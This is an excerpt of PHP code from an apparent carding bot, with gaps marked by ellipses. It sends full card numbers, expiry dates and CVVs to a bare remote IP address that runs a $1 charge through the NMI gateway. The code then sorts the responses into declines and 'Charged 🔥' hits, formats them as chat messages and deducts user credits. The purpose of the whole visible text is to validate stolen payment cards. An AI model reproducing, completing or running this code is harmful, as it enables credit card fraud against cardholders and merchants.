...
$requestUrl = "http://206.206.78.217:1611/?cc={$cc}|{$month}|{$year}|{$cvv}";
...
$dead_responses = [
    "Error: 200" => "Soft Declined - Transaction was Declined by Processor",
    "Error: 201" => "Soft Declined - Do not Honor",
    "Error: 203" => "Soft Declined - Over Limit",
    "Error: 204" => "Soft Declined - Transaction not allowed",
    "Error: 220" => "Hard Declined - Incorrect Payment Data",
    "Error: 221" => "Hard Declined - No Such Card Issuer",
    "Error: 222" => "Hard Declined - No Card Number on file with Issuer",
    "Error: 223" => "Hard Declined - Expired Card",
    "Error: 224" => "Hard Declined - Invalid Expiration Date",
    "Error: 240" => "Soft Declined - Call Issuer for Further Information",
    "Error: 250" => "Hard Declined - Pick Up Card",
    "Error: 251" => "Hard Declined - Lost Card",
    "Error: 252" => "Hard Declined - Stolen Card",
    "Error: 253" => "Hard Declined - Fraudulent Card",
    "Error: 260" => "Soft Declined - Declined with further Instructions Available",
    "Error: 261" => "Hard Declined - Stop All Recurring Payments",
    "Error: 262" => "Hard Declined - Stop this Recurring Program",
    "Error: 263" => "Soft Declined - Update Cardholder Data Available",
    "Error: 264" => "Soft Declined - Retry in a few days",
    "Error: 300" => "Hard Declined - Duplicate Transaction",
    "Error: 400" => "Hard Declined - Transaction Error",
    "Error: 410" => "Soft Declined - Invalid Merchant Configuration",
    "Error: 411" => "Soft Declined - Merchant Account Inactive",
    "Error: 420" => "Hard Declined - Communication Error",
    "Error: 421" => "Hard Declined - Communication Error with Issuer",
    "Error: 430" => "Hard Declined - Duplicate Transaction",
    "Error: 440" => "Hard Declined - Processor Format Error",
    "Error: 441" => "Hard Declined - Invalid Transaction Information",
    "Error: 460" => "Hard Declined - Processor Feature not Available",
    "Error: 461" => "Hard Declined - Unsupported Card Type",
    "Server disconnected without sending a response." => "Server disconnected without sending a response.",
...
if (stripos($response, 'success') !== false) {
    ...
    $fullResult = "<b>#NMICharge</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
                  "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
                  "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
                  "[ﾒ] <b>Gateway ➜</b> NMI 1$ Charge\n" .
                  "━━━━━━━━━━━\n" .
    ...
    exit;
} elseif (stripos($response, 'Error: 225') !== false) {
    $err = 'Soft Declined - Invalid Card Security Code ❎';
    ...
    exit;
} elseif (stripos($response, 'Error: 202') !== false) {
    $err = 'Soft Declined - Insufficient Funds';
    $newCredits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult = "<b>#NMICharge</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
